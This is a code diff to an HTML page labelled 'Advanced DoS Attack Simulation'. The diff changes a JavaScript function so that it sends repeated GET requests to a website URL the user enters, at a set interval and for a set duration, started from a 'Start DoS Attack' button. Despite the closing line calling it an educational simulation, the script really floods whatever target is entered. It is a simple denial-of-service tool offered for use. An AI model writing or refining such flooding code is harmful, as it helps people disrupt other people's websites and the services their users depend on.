@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced DoS Attack </title>
+    <title>Advanced DoS Attack Simulation</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -47,18 +47,29 @@
     <script>
         function initiateDoS() {
             var target = document.getElementById("targetWebsite").value;
-            while (true) {
+            var intervalTime = document.getElementById("intervalTime").value;
+            var duration = document.getElementById("duration").value;
+
+            var interval = setInterval(function() {
                 var xhr = new XMLHttpRequest();
                 xhr.open("GET", target, true);
                 xhr.send();
-            }
+            }, intervalTime);
+
+            setTimeout(function() {
+                clearInterval(interval);
+            }, duration);
         }
     </script>
 </head>
 <body>
-    <h1>Advanced DoS Attack </h1>
+    <h1>Advanced DoS Attack Simulation</h1>
     <label for="targetWebsite">Target Website:</label>
     <input type="text" id="targetWebsite" placeholder="Enter target website URL">
+    <label for="intervalTime">Interval Time (ms):</label>
+    <input type="number" id="intervalTime" placeholder="Enter interval time in milliseconds" value="1000">
+    <label for="duration">Attack Duration (ms):</label>
+    <input type="number" id="duration" placeholder="Enter attack duration in milliseconds" value="5000">
     <button onclick="initiateDoS()">Start DoS Attack</button>
     <p>This is an educational simulation. Use responsibly and adhere to legal standards.</p>
 </body>
